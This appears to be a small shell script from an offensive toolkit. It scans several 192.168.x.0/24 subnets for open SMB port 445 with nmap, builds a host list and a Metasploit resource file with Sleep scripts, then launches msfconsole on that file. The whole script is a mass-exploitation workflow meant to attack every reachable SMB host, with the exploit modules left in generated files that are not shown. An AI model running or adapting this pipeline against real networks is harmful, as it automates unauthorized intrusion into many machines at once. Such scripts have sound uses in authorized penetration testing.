export HOSTS="192.168.21.0/24 192.168.22.0/24 192.168.23.0/24 192.168.24.0/24 192.168.25.0/24 192.168.26.0/24 192.168.27.0/24 192.168.28.0/24"
export HOSTS="192.168.95.0/24"

# scan for hosts
nmap -T5 -p445 $HOSTS -oG tmp/hosts.txt 1>tmp/nmap.out 2>tmp/nmap.err

# fix the list of hosts
java -jar lib/sleep.jar scripts/fixlist.sl >tmp/ips.txt

# create a Metasploit .rc file
java -jar lib/sleep.jar scripts/make.sl >tmp/fun.rc

# run metasploit...
msfconsole -r tmp/fun.rc
